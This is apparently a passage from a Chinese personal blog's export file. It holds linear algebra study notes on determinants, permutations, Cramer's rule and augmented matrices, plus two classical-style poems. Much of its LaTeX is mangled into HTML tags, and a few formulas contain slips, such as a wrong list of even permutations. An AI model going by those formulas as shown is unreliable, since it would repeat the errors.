\end{matrix}</script><p>表达式 $ a<em>{11}a</em>{22}-a<em>{12}a</em>{21} $ 称为数表的二阶行列式,用$  \begin{vmatrix}<br>a<em>{11} &amp; a</em>{12} \<br>a<em>{21} &amp; a</em>{22}<br>\end{vmatrix} $ 表示。<br>数$a<em>{ij}$ 称为行列式的元素。i,j表示i行j列的元素。二阶行列式的定义可用对角线法则记忆, $a</em>{11}a<em>{22}$的连线称为主对角线, $a</em>{12}a<em>{21}$的连线称为副对角线。二阶行列式的结果为主对角线积和副对角线积的差。<br>则$<br>b_1a</em>{22}-a<em>{12}b_2 = \begin{vmatrix}<br>b_1 &amp; a</em>{12}  \<br>b<em>2 &amp; a</em>{22}<br>\end{vmatrix}<br>$<br>$<br>b<em>2a</em>{11}-a<em>{21}b_1 = \begin{vmatrix}<br>a</em>{11} &amp; b<em>1 \<br>a</em>{21} &amp; b_2<br>\end{vmatrix}<br>$</p>
<p>则方程的解为:</p>
<script type="math/tex; mode=display">
x_1 = \frac {
   \begin{vmatrix}
b_1 & a_{12}  \\
b_2 & a_{22} 
\end{vmatrix}
}{
\begin{vmatrix}
a_{11} & a_{21}  \\
a_{12} & a_{22} 
\end{vmatrix}
}</script><script type="math/tex; mode=display">
x_2 = \frac {
   \begin{vmatrix}
a_{11} &  b_1 \\
a_{21} & b_2
\end{vmatrix}
}{
\begin{vmatrix}
a_{11} & a_{21}  \\
a_{12} & a_{22} 
\end{vmatrix}
}</script><p>套用以上系数,可用行列式来求解二元一次方程。</p>
<blockquote>
<h2 id="三阶行列式"><a href="#三阶行列式" class="headerlink" title="三阶行列式"></a>三阶行列式</h2><ul>
<li>定义</li>
</ul>
</blockquote>
<p>设有9个数排成3行3列的数表<br>$<br>\begin{matrix}<br>a<em>{11} &amp; a</em>{12} &amp; a<em>{13} \<br>a</em>{21} &amp; a<em>{22} &amp; a</em>{23} \<br>a<em>{31} &amp; a</em>{32} &amp; a<em>{33}<br>\end{matrix},<br>表示为三阶行列式<br>\begin{vmatrix}<br>a</em>{11} &amp; a<em>{12} &amp; a</em>{13} \<br>a<em>{21} &amp; a</em>{22} &amp; a<em>{23} \<br>a</em>{31} &amp; a<em>{32} &amp; a</em>{33}<br>\end{vmatrix} = a<em>{11}a</em>{22}a<em>{33}+a</em>{12}a<em>{23}a</em>{31} +<br>a<em>{21}a</em>{32}a<em>{13} - a</em>{13}a<em>{22}a</em>{31}-<br>a<em>{11}a</em>{32}a<em>{23}-a</em>{12}a<em>{21}a</em>{33}<br>$ 。</p>
<p>也是对角线法则来计算三阶行列式的值。</p>
<blockquote>
<h1 id="全排列及其逆序数"><a href="#全排列及其逆序数" class="headerlink" title="全排列及其逆序数"></a>全排列及其逆序数</h1><ul>
<li>排列</li>
</ul>
</blockquote>
<p>先来看个例子:<br>1,2,3三个数字能组成多少个没有重复数字的三位数？</p>
<p>答案很简单,第一位数字有3种情况,第二位数字有2种,第三位有1种。则总的数字为：3$\times$ 2 $\times$ 1 = 6 个。<br>分别为: 123,132,213,231,312,321 。<br>上例可引出这样的问题: n个不同的元素排成一列,共有几种排法？<br>把n个不同的元素排成一列,叫做这n个元素的全排列(简称排列)。n个元素所有不同的排列数通常用$P_n$表示,例子中可以用$P_3=3\times 2 \times 1 = 6 $ 。<br>则$P_n = n.(n-1).(n-2)…3.2.1 = n!$</p>
<blockquote>
<ul>
<li>逆序数</li>
</ul>
</blockquote>
<p>在一个排列中，如果一对数的前后位置与大小顺序相反，即前面的数大于后面的数，那么它们就称为一个逆序。一个排列中逆序的总数就称为这个排列的逆序数。一个排列中所有逆序总数叫做这个排列的逆序数。也就是说，对于n个不同的元素，先规定各元素之间有一个标准次序（例如n个 不同的自然数，可规定从小到大为标准次序），于是在这n个元素的任一排列中，当某两个元素的先后次序与标准次序不同时，就说有1个逆序。一个排列中所有逆序总数叫做这个排列的逆序数。</p>
<p>逆序数为偶数的排列称为偶排列；逆序数为奇数的排列称为奇排列。 如2431中，21，43，41，31是逆序，逆序数是4，为偶排列。</p>
<blockquote>
<h3 id="求排列32514的逆序数。"><a href="#求排列32514的逆序数。" class="headerlink" title="求排列32514的逆序数。"></a>求排列32514的逆序数。</h3><p>解：<br>3的逆序数有0个;<br>2的逆序数有1个,为3;<br>5的逆序数有0个;<br>1的逆序数有3个,为3,2,5;<br>4的逆序数有1个,为5;<br>故这个排列的逆序数为t=1+3+1=5。5为奇数,这个排列为奇排列。</p>
<h1 id="n阶行列式"><a href="#n阶行列式" class="headerlink" title="n阶行列式"></a>n阶行列式</h1></blockquote>
<p>先看上边关于三阶行列式的定义,$\begin{vmatrix}<br>a<em>{11} &amp; a</em>{12} &amp; a<em>{13} \<br>a</em>{21} &amp; a<em>{22} &amp; a</em>{23} \<br>a<em>{31} &amp; a</em>{32} &amp; a<em>{33}<br>\end{vmatrix} = a</em>{11}a<em>{22}a</em>{33}+a<em>{12}a</em>{23}a<em>{31} +<br>a</em>{21}a<em>{32}a</em>{13} - a<em>{13}a</em>{22}a<em>{31}-<br>a</em>{11}a<em>{32}a</em>{23}-a<em>{12}a</em>{21}a<em>{33}<br>$ ,容易看出等式后边都是三个行、列元素的积。每一个元素可以用$a</em>{1p<em>1}a</em>{2p<em>2}a</em>{3p_3}$的形式表示。第一个下标(行标)为123,而第二个下标(列标)$p_1p_2p_3$为1,2,3这三个数字的某一个排列。<br>其中带正号的列标排列为123,321,312;带负号的列标排列为132,213,321。经计算,前三个排列为偶排列,后边排列为奇排列。因此,各项所带正负号可以表示为 $(-1)^t$,其中t为排列的逆序数。<br>三阶行列式可以写成:</p>
<script type="math/tex; mode=display">
\begin{vmatrix}
a_{11} & a_{12} & a_{13} \\
a_{21} & a_{22} & a_{23} \\
a_{31} & a_{32} & a_{33}
\end{vmatrix}  =  \sum (-1)^ta_{1p_1}a_{2p_2}a_{3p_3}</script><p>把此种形式可以推广到$n^2$个数表,</p>
<blockquote>
<ul>
<li>定义</li>
</ul>
</blockquote>
<p>设有$n^2$个数,排成n行n列的数表,</p>
<script type="math/tex; mode=display">\begin{matrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}&       &{\vdots}\\ 
{a_{n1}}&{a_{n2}}&{\cdots}&{a_{nn}}\\
\end{matrix}</script><p>,得到形如$(-1)^ta<em>{1p_1}a</em>{2p<em>2}a</em>{3p<em>3}…a</em>{np<em>n}$的项,<br>$a</em>{1p<em>1}a</em>{2p<em>2}a</em>{3p<em>3}…a</em>{np_n}$ 为自然数1,2…n的一个排列，t为这个排列的逆序数。这样的排列共有n!个，因而形如上述的项共有n!项。所有这n!项的代数和为 </p>
<script type="math/tex; mode=display">
\sum (-1)^ta_{1p_1}a_{2p_2}a_{3p_3}...a_{np_n}</script><p>称为n阶行列式,记作:</p>
<script type="math/tex; mode=display">\begin{vmatrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}& &{\vdots}\\
{a_{n1}}&{a_{n2}}&{\cdots}&{a_{nn}}\\
\end{vmatrix}</script><p>,简记为$det(a<em>{ij})$,其中数$a</em>{ij}$为行列式D的(i,j)元。</p>
<blockquote>
<h1 id="对换"><a href="#对换" class="headerlink" title="对换"></a>对换</h1></blockquote>
<p>在排列中,将任意两个元素对调,其他元素不动。这种做出新排列的手续叫对换。将相邻的两个元素对换称为相邻对换。</p>
<blockquote>
<ul>
<li><p>定理1  一个排列中的任意两个元素对换,排列改变奇偶性。</p>
</li>
<li><p>定理2 n阶行列式也可以定义为 $ D=\sum (-1)^ta<em>{p_11}a</em>{p<em>22}a</em>{p<em>33}…a</em>{p_nn} $ ,其中t为$p_1p_2…p_n$的逆序数。</p>
</li>
</ul>
<h1 id="行列式性质"><a href="#行列式性质" class="headerlink" title="行列式性质"></a>行列式性质</h1></blockquote>
<p>记</p>
<script type="math/tex; mode=display">

D = \begin{vmatrix}
{a_{11}}&{a_{12}}&{\cdots}&{a_{1n}}\\
{a_{21}}&{a_{22}}&{\cdots}&{a_{2n}}\\
{\vdots}&{\vdots}& &{\vdots}\\
{a_{n1}}&{a_{n2}}&{\cdots}&{a_{nn}}\\
\end{vmatrix}
,

D_T = \begin{vmatrix}
{a_{11}}&{a_{21}}&{\cdots}&{a_{n1}}\\
{a_{12}}&{a_{22}}&{\cdots}&{a_{n2}}\\
{\vdots}&{\vdots}& &{\vdots}\\
{a_{1n}}&{a_{2n}}&{\cdots}&{a_{nn}}\\
\end{vmatrix}</script><p>行列式$D_T$称为行列式D的转置行列式。</p>
<blockquote>
<ul>
<li><p>性质1  行列式和它的转置行列式相等。</p>
</li>
<li><p>性质2  互换行列式的两行(列),行列式变号。</p>
</li>
<li><p>推论 如果行列式有两行(列)完全相同,行列式值等于0。</p>
</li>
<li><p>性质3 行列式中的某一行(列)中所有的元素都乘以一个数k,等于用数k乘以此行列式。</p>
</li>
<li><p>推论 行列式中的某一行(列)中所有元素的公因子可以提到行列式记号的外面。</p>
</li>
</ul>
<ul>
<li><p>性质4 如果行列式如果有两行(列)元素成比例,行列式值等于0。</p>
</li>
<li><p>性质5 若行列式的某一列(行)的元素都是两数之和,例如第i列的元素都是两数之和：<br>$<br>D = \begin{vmatrix}<br>{a<em>{11}}&amp;{a</em>{21}}&amp;{\cdots}&amp; (a<em>{1i}+a’</em>{1i}) &amp;{\cdots}&amp; {a<em>{n1}}\<br>{a</em>{12}}&amp;{a<em>{22}}&amp;{\cdots}&amp;(a</em>{2i}+a’<em>{2i}) &amp;{\cdots} &amp;{a</em>{n2}}\<br>{\vdots}&amp;{\vdots}&amp; &amp;{\vdots} &amp; &amp; {\vdots}\<br>{a<em>{1n}}&amp;{a</em>{2n}}&amp;{\cdots}&amp;(a<em>{ni}+a’</em>{ni}) &amp;{\cdots} &amp; {a<em>{nn}}\<br>\end{vmatrix}<br>$,则D等于下面两个行列式的和<br>$<br>\begin{vmatrix}<br>{a</em>{11}}&amp;{a<em>{21}}&amp;{\cdots}&amp; a</em>{1i} &amp;{\cdots}&amp; {a<em>{n1}}\<br>{a</em>{12}}&amp;{a<em>{22}}&amp;{\cdots}&amp; a</em>{2i} &amp;{\cdots} &amp;{a<em>{n2}}\<br>{\vdots}&amp;{\vdots}&amp; &amp;{\vdots} &amp; &amp; {\vdots}\<br>{a</em>{1n}}&amp;{a<em>{2n}}&amp;{\cdots}&amp;  a</em>{ni} &amp;{\cdots} &amp; {a<em>{nn}}\<br>\end{vmatrix} + \begin{vmatrix}<br>{a</em>{11}}&amp;{a<em>{21}}&amp;{\cdots}&amp; a’</em>{1i} &amp;{\cdots}&amp; {a<em>{n1}}\<br>{a</em>{12}}&amp;{a<em>{22}}&amp;{\cdots}&amp; a’</em>{2i}  &amp;{\cdots} &amp;{a<em>{n2}}\<br>{\vdots}&amp;{\vdots}&amp; &amp;{\vdots} &amp; &amp; {\vdots}\<br>{a</em>{1n}}&amp;{a<em>{2n}}&amp;{\cdots}&amp; a’</em>{ni} &amp;{\cdots} &amp; {a_{nn}}\<br>\end{vmatrix}.<br>$</p>
</li>
</ul>
<ul>
<li>性质6 把行列式的某一列(行)的各个元素都乘以同一个数字，然后加到另一列(行)对应元素上,行列式不变.</li>
</ul>
</blockquote>
<p>例如以数k乘第j列加到第i列上(记作$c_i+kc_j$),有</p>
<script type="math/tex; mode=display">

\begin{vmatrix}
{a_{11}}&{\cdots} & {a_{1i}}&{\cdots}& a_{1j} &{\cdots}& {a_{1n}}\\
{a_{12}}&{\cdots} & {a_{2i}}&{\cdots}& a_{2j} &{\cdots} &{a_{2n}}\\
{\vdots}&        & {\vdots} & &{\vdots} & {\vdots}\\
{a_{1n}}&{\cdots} &{a_{ni}}&{\cdots}&  a_{nj} &{\cdots} & {a_{nn}}\\
\end{vmatrix}

\Longrightarrow{\text{c_i+kc_j}}  

\begin{vmatrix}
{a_{11}}&{\cdots} & ({a_{1i}}+ka_{1j})&{\cdots}& a_{1j} &{\cdots}& {a_{1n}}\\
{a_{12}}&{\cdots} & ({a_{2i}}+ka_{2j}) &{\cdots}& a_{2j} &{\cdots} &{a_{2n}}\\
{\vdots}&        & {\vdots} & &{\vdots} & {\vdots}\\
{a_{1n}}&{\cdots} & ({a_{ni}}+ka_{nj})&{\cdots}&  a_{nj} &{\cdots} & {a_{nn}}\\
\end{vmatrix}  (i\not=j)</script><blockquote>
<h1 id="行列式按行-列-展开"><a href="#行列式按行-列-展开" class="headerlink" title="行列式按行(列)展开"></a>行列式按行(列)展开</h1></blockquote>
<p>一般来说,低阶行列式的计算比高阶行列式的计算简单。自然的我们考虑用低阶行列式来计算高阶行列式。为此，引入余子式和代数余子式的概念。</p>
<p>在n阶行列式中,把(i,j)元$a<em>{ij}$所在的第i行和第j列划去后,留下的n-1阶行列式叫做(i,j)元$a</em>{ij}$的余子式,记做$M<em>{ij}$;记$A</em>{ij}=(-1)^{i+j}M<em>{ij} $,$A</em>{ij}$叫做(i,j)元$a_{ij}$的代数余子式。</p>
<blockquote>
<ul>
<li>引理</li>
</ul>
</blockquote>
<p>一个n阶行列式，如果其中第i行所有元素除(i,j)元$a<em>{ij}$外都为0,那么这个行列式等于$a</em>{ij}$与它的代数余子式的乘积,即:<br>D=$a<em>{ij}A</em>{ij}$。</p>
<blockquote>
<ul>
<li>定理</li>
</ul>
</blockquote>
<p>行列式等于它的任一行(列)的各元素与其对应的代数余子式乘积之和。</p>
<p>范德蒙德行列式</p>
<script type="math/tex; mode=display">
D_n=
\begin{vmatrix}
 1 & 1 &{\cdots}& 1 \\
x_1 & x_2 &{\cdots}& x_n \\
x_1^2 & x_2^2 &{\cdots}& x_n^2 \\
{\vdots}& {\vdots} & & {\vdots}\\
x_1^{n-1} & x_2^{n-1} &{\cdots}& x_n^{n-1} \\
\end{vmatrix}
=
\prod_{n \geq i \geq j \geq 1} (x_i - x_j)。</script><p>其中$\prod$符号表示全体同类因子的乘积。<br>证明:<br>用数学归纳法证明,因为$D<em>2=\begin{vmatrix}<br>1 &amp; 1 \<br>x_1 &amp; x_2<br>\end{vmatrix} = x_2 - x_1 = \prod</em>{2 \geq i \geq j \geq 1} (x_i - x_j)$。所以当n=2时,上述等式成立。假设上述公式对n-1阶范德蒙德行列式成立。更多证明参考同济线性代数第五版。</p>
<blockquote>
<ul>
<li>推论</li>
</ul>
</blockquote>
<p>行列式某一行(列)的元素与另一行(列)的对应元素的代数余子式乘积之和等于零。</p>
<blockquote>
<h1 id="克拉默法则"><a href="#克拉默法则" class="headerlink" title="克拉默法则"></a>克拉默法则</h1></blockquote>
<p>含有n个未知数$x_1,x_2,x_3…x_n$的n个线性方程组</p>
<script type="math/tex; mode=display">
\begin{cases}
a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n=b_1 \\ 
a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n=b_2 \\ 
\cdots\cdots\\
a_{n1}x_1+a_{n2}x_2 + \cdots + a_{nn}x_n=b_n
\end{cases}</script><p>,和二三元线性方程组类似，它的解可以用n阶行列式表示,即有$克拉默法则$。<br>$如果上述线性方程组的系数不为0,即D=\begin{vmatrix}<br>a<em>{11} &amp; \cdots &amp; a</em>{1n} \<br>{\vdots}&amp; &amp;{\vdots}  \<br>a<em>{n1} &amp; \cdots &amp; a</em>{nn}<br>\end{vmatrix} \not= 0<br>$,那么方程组有唯一解,<br>$x_1 = \frac {D_1}{D},x_2=\frac {D_2}{D},…,x_n = \frac {D_n}{D} $,其中$D_j(j=1,2,3,…,n)$是把系数行列式D中第j列元素用方程组右端的常数项替代后得到的n阶行列式，即:</p>
<script type="math/tex; mode=display">
D_j=
\begin{vmatrix}
a_{11} & \cdots & a_{1.j-1} & b_1 & a_{1.j+1}& \cdots & a_{1n} \\
{\vdots}& & {\vdots} & {\vdots} & {\vdots} & & {\vdots} \\
a_{n1} & \cdots & a_{n.j-1} & b_n & a_{n.j+1}&\cdots & a_{nn}
\end{vmatrix}</script><blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><p><a href="https://zh.wikipedia.org/wiki/%E8%A1%8C%E5%88%97%E5%BC%8F" target="_blank" rel="noopener">行列式</a></p>
</li>
<li><p>同济线性代数第五版</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线代</tag>
      </tags>
  </entry>
  <entry>
    <title>七弦叹</title>
    <url>/2018/12/13/%E6%9D%82%E4%BE%83/%E4%B8%83%E5%BC%A6%E5%8F%B9/</url>
    <content><![CDATA[<p>七弦叹 </p>
<p>一弦叹，叹长安，灯火阑珊，九州共婵娟，盛世烟花纷繁，大明宫外皓月圆； </p>
<p>二弦叹，叹临安，西子湖畔，无言泪阑干，独行烟柳青山，烟雨如梦梦江南； </p>
<p>三弦叹，叹金陵，乍雨初晴，陌上离人行，古道荒草长亭，红颜若雪愁思萦； </p>
<p>四弦叹，叹姑苏，烟雨难渡，不见当年路，不知船向何处，谁人知我相思苦？ </p>
<p>五弦叹，叹汴梁，人走茶凉，花落终成殇，一城风雨彷徨，落雨空响青石巷； </p>
<p>六弦叹，叹阳关，千年尘烟，一缕箫声咽，曲未终人已散，惟有山河寂无言； </p>
<p>七弦叹，叹流年，过眼云烟，往事随风远，多少悲欢离散，梦醒沧海变桑田。</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>仓央嘉措：我问佛</title>
    <url>/2017/11/03/%E6%9D%82%E4%BE%83/%E4%BB%93%E5%A4%AE%E5%98%89%E6%8E%AA%EF%BC%9A%E6%88%91%E9%97%AE%E4%BD%9B/</url>
    <content><![CDATA[<p>《我问佛》，此文作者颇有争议，普遍认为是仓央嘉措的作品，也有说是出自现代人之手。不过无论是谁写的，都是一篇难得的经典好文。</p>
<p>仓央嘉措是一位才华出众、富有文采的民歌诗人，写了很多细腻真挚的情歌。最为经典的拉萨藏文木刻版《仓央嘉措情歌》，被译成20多种文字，几乎传遍了全世界，他的诗歌已经超越民族、时空、国界，成为宝贵的文化遗产。</p>
<p>《我问佛》</p>
<p>我问佛</p>
<p>为何不给所有女子</p>
<p>羞花闭月的容颜</p>
<p>佛曰:</p>
<p>那只是昙花的一现</p>
<p>用来蒙蔽世俗的眼</p>
<p>没有什么美</p>
<p>可以抵过一颗纯净仁爱的心</p>
<p>我把它赐给每一个女子</p>
<p>可有的人让它蒙上了灰</p>
<p><img src="https://i.imgur.com/hnKCyKu.jpg" alt></p>
<p>我问佛</p>
<p>世间为何有那么多遗憾?</p>
<p>佛曰:</p>
<p>这是一个婆娑世界</p>
<p>婆娑即遗憾</p>
<p>没有遗憾</p>
<p>给你再多幸福</p>
<p>也不会体会快乐</p>
<p><img src="https://i.imgur.com/Lx3UVvq.jpg" alt></p>
<p>我问佛</p>
<p>如何让人们的心</p>
<p>不再感到孤单?</p>
<p>佛曰：</p>
<p>每一颗心</p>
<p>生来就是孤单而残缺的</p>
<p>多数带着这种残缺度过一生</p>
<p>只因与能使它圆满的另一半相遇时，</p>
<p>不是疏忽错过，</p>
<p>就是已失去了拥有它的资格。</p>
<p><img src="https://i.imgur.com/elqB5Nh.jpg" alt></p>
<p>我问佛:</p>
<p>如果遇到了可以爱的人，</p>
<p>却又怕不能把握该怎么办?</p>
<p>佛曰:</p>
<p>留人间多少爱</p>
<p>迎浮世千重变</p>
<p>和有情人做快乐事</p>
<p>别问是劫是缘</p>
<p><img src="https://i.imgur.com/ehvueog.jpg" alt></p>
<p>我问佛:</p>
<p>为什么总是</p>
<p>在我悲伤的时候下雪</p>
<p>佛说:</p>
<p>冬天就要过去，留点记忆</p>
<p>我问佛:</p>
<p>为什么每次下雪</p>
<p>都是我不在意的夜晚</p>
<p>佛说:</p>
<p>不经意的时候</p>
<p>人们总会错过很多真正的美丽</p>
<p>我问佛:</p>
<p>那过几天还下不下雪</p>
<p>佛说:</p>
<p>不要只盯着这个季节，</p>
<p>错过了今冬</p>
<p><img src="https://i.imgur.com/nbC5Va6.jpg" alt></p>
<p>我问佛:</p>
<p>如何才能如你般睿智?</p>
<p>佛曰:</p>
<p>人生有八苦</p>
<p>生老病死  爱别离 </p>
<p>怨长久 求不得 放不下</p>
<p>只有在体验痛苦的过程中</p>
<p>参透生命的真谛</p>
<p>才能得到永生</p>
<p>春来花自青,秋至叶飘零, </p>
<p>生存于自然法则之中</p>
<p>一个人必须看得懂 放得下</p>
<p>才能得到自在</p>
]]></content>
      <categories>
        <category>杂侃</category>
      </categories>
      <tags>
        <tag>杂侃</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数二之矩阵和方程组</title>
    <url>/2018/07/15/%E6%95%B0%E5%AD%A6/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E4%BA%8C%E4%B9%8B%E7%9F%A9%E9%98%B5%E5%92%8C%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    <content><![CDATA[<p>数学上，一个 m×n 的矩阵是一个由 m 行（row）n 列（column）元素排列成的矩形阵列。矩阵里的元素可以是数字、符号或数学式。以下是一个由 6 个数字元素构成的 2 行 3 列的矩阵：<br>$ \begin{bmatrix}1 &amp; 9 &amp; -13 \20 &amp; 5 &amp; -6 \end{bmatrix} $。<br>大小相同（行数列数都相同）的矩阵之间可以相互加减，具体是对每个位置上的元素做加减法。矩阵的乘法则较为复杂。两个矩阵可以相乘，当且仅当第一个矩阵的列数等于第二个矩阵的行数。矩阵的乘法满足结合律和分配律，但不满足交换律。</p>
<p>矩阵的一个重要用途是解线性方程组。线性方程组中未知量的系数可以排成一个矩阵，加上常数项，则称为增广矩阵。另一个重要用途是表示线性变换，即是诸如 f(x)=4x 之类的线性函数的推广。设定基底后，某个矢量 v 可以表示为 m×1 的矩阵，而线性变换 f 可以表示为列数为 m 的矩阵 A，使得经过变换后得到的矢量 f(v)可以表示成 Av 的形式。矩阵的特征值和特征矢量可以揭示线性变换的深层特性。</p>
<p>矩阵是高等代数学中的常见工具，也常见于统计分析等应用数学学科中。在物理学中，矩阵于力学、电路学、光学和量子物理中都有应用；计算机科学中，三维动画制作也需要用到矩阵。矩阵的运算是数值分析领域的重要问题。将矩阵分解为简单矩阵的组合可以在理论和实际应用上简化矩阵的运算。对一些应用广泛而形式特殊的矩阵，例如稀疏矩阵和准对角矩阵，有特定的快速运算算法。关于矩阵相关理论的发展和应用，请参考矩阵理论。在天体物理、量子力学等领域，也会出现无穷维的矩阵，是矩阵的一种推广。</p>
<a id="more"></a>
<h1 id="线性方程组"><a href="#线性方程组" class="headerlink" title="线性方程组"></a>线性方程组</h1><p>形如$ a<em>1x_1+a_2x_2+…+a_nx_n=b $ 的方程称为含有 n 个未知量的线性方程,其中$ a_1,a_2,…a_n $ 和 b 为实数,$ x_1,x_2,…x_n $称为变量。含有 m 个方程和 n 个未知量的线性方程组定义为:<br>$<br>\begin{cases}<br>a</em>{11}x<em>1+a</em>{12}x<em>2+…+a</em>{1n}x<em>1=b_1 \<br>a</em>{21}x<em>1+a</em>{22}x<em>2+…+a</em>{2n}x<em>2=b_2 \<br>                   {\vdots} \<br>a</em>{m1}x<em>1+a</em>{m2}x<em>2+…+a</em>{mn}x_n=b_m<br>\end{cases}<br>$.<br>线性方程组的所有解的集合称为方程组的解集。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>若两个含有相同变量的方程组具有相同的解集,则称它们为等价的。</p>
<h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>若方程组中,第 k 个方程的前 k-1 个变量的系数均为 0,且$x_k(k=1,2,3…n)$的系数都不为 0,则称这样的方程组为严格三角形的。</p>
<blockquote>
<ul>
<li>例 1<br>求解方程组<br>$<br>\begin{cases}<br>3x_1 + 2x_2 + x_3 = 1 \<br>x_2 - x_3 = 2 \<br>2x_3=4<br>\end{cases}<br>$.</li>
</ul>
</blockquote>
<p>很简单,回代法解此方程,先求解$x_3$,代入第二个方程,依次求解。求解后方程组的解为(-3,4,2)。</p>
<blockquote>
<ul>
<li>例 2</li>
</ul>
</blockquote>
<p>求解方程组<br>$<br>\begin{cases}<br>x_1 + 2x_2 + x_3 = 3 \<br>3x_1 - x_2 - 3x_3 = -1  \<br>2x_1 + 3x_2 + x_3 = 4<br>\end{cases}<br>$。<br>化简为严格三角形的方程组:<br>$<br>\begin{cases}<br>x_1 + 2x_2 + x_3 = 3 \<br>-7x_2 - 6x_3 = -10 \<br>-\frac{1}{7}x_3= -\frac{4}{7}<br>\end{cases}<br>$<br>,可得方程组的解集为(3,-2,4)。</p>
<p>可以把例 2 中的方程组同一个以系数$x_i$为元的$3\times3$的数字阵列联系起来。<br>$<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 1 \<br>3 &amp; -1 &amp; -3 \<br>2 &amp; 3 &amp; 1<br>\end{bmatrix}<br>$ 称这个阵列为方程组的系数矩阵。一个 m 行 n 列的矩阵称为$m \times n$矩阵。如果矩阵的行数和列数相等,即 m=n,则称该矩阵为方阵。<br>如果在系数矩阵右边加一列方程组的右端项,得到一个新的矩阵</p>
<script type="math/tex; mode=display">
\left [
    \begin {array} {cc|c}
      1 & 2 & 1 & 3 \\
      3 & -1 & -3 & -1\\
      2 & 3 & 1 & 4
    \end {array}
\right ]</script><p>称这个矩阵为方程组的增广矩阵。一般地,当一个$m\times r$的矩阵 B 采用上述方法附加到一个$m \times n$的矩阵 A 上,相应的增广矩阵记为$A \mid B $。若<br>$<br>A=\begin{bmatrix}<br>{a<em>{11}}&amp;{a</em>{12}}&amp;{\cdots}&amp;{a<em>{1n}}\<br>{a</em>{21}}&amp;{a<em>{22}}&amp;{\cdots}&amp;{a</em>{2n}}\<br>{\vdots}&amp;{\vdots}&amp; &amp;{\vdots}\<br>{a<em>{m1}}&amp;{a</em>{m2}}&amp;{\cdots}&amp;{a<em>{mn}}\<br>\end{bmatrix}<br>,<br>B= \begin{bmatrix}<br>{b</em>{11}}&amp;{b<em>{12}}&amp;{\cdots}&amp;{b</em>{1r}}\<br>{b<em>{21}}&amp;{b</em>{22}}&amp;{\cdots}&amp;{b<em>{2r}}\<br>{\vdots}&amp;{\vdots}&amp; &amp;{\vdots}\<br>{b</em>{m1}}&amp;{b<em>{m2}}&amp;{\cdots}&amp;{b</em>{mr}}\<br>\end{bmatrix}<br>$<br>则<br>$<br>(A\mid B)=\left [<br>    \begin {array} {ccc|ccc}<br>      {a<em>{11}}&amp;{\cdots}&amp;{a</em>{1n}} &amp; {b<em>{11}}&amp;{\cdots}&amp;{a</em>{1r}}  \<br>      {\vdots}&amp; \<br>      {a<em>{m1}}&amp;{\cdots}&amp;{a</em>{mn}}&amp; {b<em>{m1}}&amp;{\cdots}&amp;{b</em>{mn}}<br>    \end {array}<br>\right ]<br>$。<br>对每一个方程组，均对应于一个增广矩阵，形如:<br>$<br>\left[<br>    \begin {array} {ccc|c}<br>      {a<em>{11}}&amp;{\cdots}&amp;{a</em>{1n}} &amp; {b<em>1} \<br>      {\vdots}&amp; &amp; &amp;{\vdots}\<br>      {a</em>{m1}}&amp;{\cdots}&amp;{a_{mn}} &amp; {b_m}<br>    \end {array}<br>\right]<br>$。<br>方程组的求解可以通过计算增广矩阵得到。用于得到等价方程组的三个运算,可对增广矩阵进行如下运算:</p>
<ol>
<li>交换两行</li>
<li>以非 0 实数乘以某行</li>
<li>将某行替换为它与其他行的倍数的和</li>
</ol>
<blockquote>
<ul>
<li>例 3</li>
</ul>
</blockquote>
<p>求解方程组</p>
<script type="math/tex; mode=display">
\begin{cases}
-x_2 - x_3 + x_4 = 0 \\
x_1 + x_2 + x_3 + x_4 = 6  \\
2x_1 + 4x_2 + x_3 - 2x_4 = -1 \\
3x_1 + x_2 - 2x_3 + 2x_4 = 3
\end{cases}</script><p>解：该方程组对应的增广矩阵为:</p>
<script type="math/tex; mode=display">
\left[
    \begin {array} {cccc|c}
     0 & -1 & -1 & 1 & 0 \\
     1 & 1 &  1 & 1 & 6 \\
     2 & 4 & 1 & -2 & -1 \\
     3 & 1 & -2 & 2 & 3
    \end {array}
\right]</script><p>交换第 1、2 行,得增广矩阵为: $$<br>\left[<br>\begin {array} {cccc|c}<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \<br>0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \<br>2 &amp; 4 &amp; 1 &amp; -2 &amp; -1 \<br>3 &amp; 1 &amp; -2 &amp; 2 &amp; 3<br>\end {array}<br>\right]</p>
<script type="math/tex; mode=display">
第 1 行都乘以-2,然后第 3 行加上去,同理第 1 行乘以-3，第 4 行加上去，得增广矩阵:</script><p>\left[<br>\begin {array} {cccc|c}<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \<br>0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \<br>0 &amp; 2 &amp; -1 &amp; -4 &amp; -13 \<br>0 &amp; -2 &amp; -5 &amp; -1 &amp; -15<br>\end {array}<br>\right]</p>
<script type="math/tex; mode=display">
</script><p>\left[<br>\begin {array} {cccc|c}<br>1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \<br>0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \<br>0 &amp; 0 &amp; -3 &amp; -2 &amp; -13 \<br>0 &amp; 0 &amp; 0 &amp; -1 &amp; -2<br>\end {array}<br>\right]</p>
<script type="math/tex; mode=display">
回代法求解即可得到方程组的解为:(2,-1,3,2)。

# 行阶梯形

## 定义

### 定义

若一个矩阵满足

1. 每一个非零行中的一个非零元为 1;
